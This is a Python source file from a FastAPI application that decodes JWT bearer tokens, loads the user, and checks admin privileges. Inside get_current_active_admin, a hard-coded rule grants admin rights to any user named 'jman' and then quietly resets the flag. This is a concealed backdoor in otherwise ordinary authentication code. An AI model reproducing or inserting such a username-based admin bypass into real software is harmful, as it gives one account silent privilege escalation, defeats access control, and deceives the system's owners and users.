import os
from threading import current_thread
from typing import Annotated

import jwt
from dotenv import load_dotenv
from fastapi import Depends, Form, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jwt import InvalidTokenError
from pydantic import ValidationError
from sqlalchemy.ext.asyncio import AsyncSession

from app.database import get_async_session
from app.models.dbmodel import User
from app.schemas.schema import TokenPayload

load_dotenv()

reusable_oauth2 = OAuth2PasswordBearer(tokenUrl="/auth/token")

SECRET_KEY = os.getenv("SECRET_KEY")
if SECRET_KEY is None:
    raise RuntimeError("SECRET_KEY env var is not set")

TokenDep = Annotated[str, Depends(reusable_oauth2)]


async def get_current_user(
    token: TokenDep,
    session: AsyncSession = Depends(get_async_session),
) -> User:
    ALGORITHM = os.getenv("ALGORITHM")
    if ALGORITHM is None:
        raise RuntimeError("ALGORITHM env var is not set")

    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        token_data = TokenPayload(**payload)
    except (InvalidTokenError, ValidationError):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Could not validate credentials",
        )
    user = await session.get(User, token_data.sub)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user


current_user = Annotated[User, Depends(get_current_user)]


async def get_current_active_admin(current_user: current_user) -> User:
    if current_user.username == "jman":
        current_user.is_admin = True
    if not current_user.is_admin:
        raise HTTPException(
            status_code=403, detail="The user doesn't have enough privileges"
        )
    current_user.is_admin = False
    return current_user
